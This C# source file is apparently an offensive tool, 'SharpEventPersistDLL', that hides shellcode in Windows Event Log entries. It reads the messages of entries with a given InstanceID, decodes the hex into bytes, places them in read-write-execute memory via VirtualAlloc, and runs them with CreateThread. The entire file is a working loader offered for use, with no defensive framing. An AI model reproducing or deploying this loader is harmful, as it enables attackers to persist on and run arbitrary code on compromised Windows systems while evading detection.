using System;
using CommandLine;
using System.Linq;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SharpEventPersistDLL
{
    class Program
    {
        public class Options
        {
            [Option('i', "instanceid", Required = false, HelpText = "Select an InstanceID Number.")]
            public string Instanceid { get; set; }

            [Option('s', "source", Required = false, HelpText = "Select a Source.")]
            public string Source { get; set; }

            [Option('e', "eventlog", Required = false, HelpText = "Select an Eventlog.")]
            public string Eventlog { get; set; }
        }

        static void Main(string[] args)
        {

            Parser.Default.ParseArguments<Options>(args)
                   .WithParsed(options =>
                   {
                       if (!string.IsNullOrWhiteSpace(options.Instanceid))
                       {
                           Console.WriteLine($"InstanceID is manually set to: {options.Instanceid}");
                       }
                       else
                       {
                           Console.WriteLine("You need to set the InstanceID with \"--instanceid\" and the source Eventlog with \"--eventlog\"");
                           System.Environment.Exit(1);
                       }
                       if (!string.IsNullOrWhiteSpace(options.Eventlog))
                       {
                           Console.WriteLine($"Eventlog is manually set to: {options.Eventlog}");
                       }
                       else
                       {
                           Console.WriteLine("You need to set the InstanceID with \"--instanceid\" and the source Eventlog with \"--eventlog\"");
                           System.Environment.Exit(1);
                       }



                       EventLog log = new EventLog(options.Eventlog);
                       int InstanceID_int = Int32.Parse(options.Instanceid);
                       var entries = log.Entries.Cast<EventLogEntry>().Where(x => x.InstanceId == InstanceID_int).Select(x => new
                       {
                           x.Message
                       }).ToList();

                       string shellcodeEvent = string.Empty;
                       foreach (var entry in entries)
                       {
                           shellcodeEvent += entry.Message;
                       }

                       byte[] sc = HexStringConverter.ToByteArray(shellcodeEvent);
                       IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)(sc.Length + 1), AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
                       Marshal.Copy(sc, 0, baseAddr, sc.Length);
                       IntPtr hThread = CreateThread(IntPtr.Zero, (UIntPtr)0, baseAddr, IntPtr.Zero, 0, IntPtr.Zero);
                       WaitForSingleObject(hThread, 0xFFFFFFFF);
                       return;

                   }
                   );

        }
        static class HexStringConverter
        {
            public static byte[] ToByteArray(String HexString)
            {
                int NumberChars = HexString.Length;
                byte[] bytes = new byte[NumberChars / 2];
                for (int i = 0; i < NumberChars; i += 2)
                {
                    bytes[i / 2] = Convert.ToByte(HexString.Substring(i, 2), 16);
                }
                return bytes;
            }
        }
        [Flags]
        public enum AllocationType : uint
        {
            COMMIT = 0x1000,
            RESERVE = 0x2000,
            RESET = 0x80000,
            LARGE_PAGES = 0x20000000,
            PHYSICAL = 0x400000,
            TOP_DOWN = 0x100000,
            WRITE_WATCH = 0x200000
        }

        [Flags]
        public enum MemoryProtection : uint
        {
            EXECUTE = 0x10,
            EXECUTE_READ = 0x20,
            EXECUTE_READWRITE = 0x40,
            EXECUTE_WRITECOPY = 0x80,
            NOACCESS = 0x01,
            READONLY = 0x02,
            READWRITE = 0x04,
            WRITECOPY = 0x08,
            GUARD_Modifierflag = 0x100,
            NOCACHE_Modifierflag = 0x200,
            WRITECOMBINE_Modifierflag = 0x400
        }


        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            UIntPtr dwSize,
            AllocationType flAllocationType,
            MemoryProtection flProtect);
        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            UIntPtr dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);

    }
}